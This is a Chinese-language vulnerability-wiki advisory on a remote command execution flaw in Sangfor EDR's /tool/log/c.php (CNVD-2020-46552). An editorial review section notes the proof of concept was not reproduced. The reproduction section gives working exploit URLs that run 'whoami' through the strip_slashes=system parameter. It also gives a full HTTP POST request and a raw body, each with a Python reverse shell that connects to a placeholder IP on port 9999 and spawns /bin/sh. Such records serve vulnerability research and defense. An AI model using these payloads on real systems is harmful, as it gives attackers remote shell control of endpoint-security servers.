---
cnvd: "CNVD-2020-46552"
version: "EDR v3.2.16"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-0d17e142fee5108edb947409"
entity_id: "ve-0d17e142fee5108edb947409"
schema_version: "1"
title: "深信服 EDR c.php 远程命令执行漏洞 CNVD-2020-46552"
product: "Sangfor EDR"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CNVD-2020-46552"
referenced_identifiers: ""
prerequisites: "3.2.16/17/19；无明确认证说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-EDR-c.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-2020-46552.md"
review_date: "2026-10-02"
side_effects: "回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_status: "unknown"
---

# 深信服 EDR c.php 远程命令执行漏洞 CNVD-2020-46552

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor EDR
- 本文讨论：CNVD-2020-46552 c.php
- 版本、权限与配置前提：3.2.16/17/19；无明确认证说明
- 资料类型：EDR RCE PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- version元数据仅首个版本；反弹体重复两次，固定Content-Length不对应占位长度
- 无响应和厂商修复/原披露链接
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 鉴权、编号准确映射和固定版本待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，可向目标服务器发送恶意构造的HTTP请求，从而获得目标服务器的权限，实现远程代码控制执行。

## 漏洞影响

```
EDR v3.2.16
EDR v3.2.17
EDR v3.2.19
```

## 漏洞复现

```plain
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami
https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami
```





**反弹shell**


```http
POST /tool/log/c.php HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 256

strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


向 **/tool/log/c.php**  POST以下数据即可


```plain
strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
